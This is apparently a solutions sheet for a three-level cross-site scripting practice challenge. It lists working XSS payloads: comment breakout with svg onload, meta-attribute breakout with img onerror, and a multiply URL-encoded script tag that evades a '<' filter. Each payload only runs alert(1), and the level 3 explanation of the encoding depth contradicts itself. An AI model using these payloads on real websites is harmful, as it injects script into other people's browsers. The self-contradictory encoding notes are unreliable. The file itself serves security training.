# polyglot — solutions

Single-context polyglot challenges (HTML comment, meta refresh URL, multi-decode).

### polyglot-level1

`/polyglot/level1/?query=--%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `--><svg onload=alert(1)>`
- context: inside <!-- QUERY -->; close comment then inject

### polyglot-level2

`/polyglot/level2/?query=x%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `x"><img src=x onerror=alert(1)>`
- context: double-quoted meta refresh content; javascript: refresh is blocked, so break out

### polyglot-level3

`/polyglot/level3/?query=%2525253Cscript%2525253Ealert%252525281%25252529%2525253C%2525252Fscript%2525253E`

Note: server URL-decodes three times. To survive the post-second-decode `<` check we provide a payload whose final decode produces a `<` only after the check. Easier path: rely on third decode of `<`:

- payload: `%2525253Cscript%2525253Ealert%252525281%25252529%2525253C%2525252Fscript%2525253E`
- raw query (triple-encoded `<` only): `%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E`
- context: one framework decode plus two handler decodes before the `<` check, then one more on output: encode four times
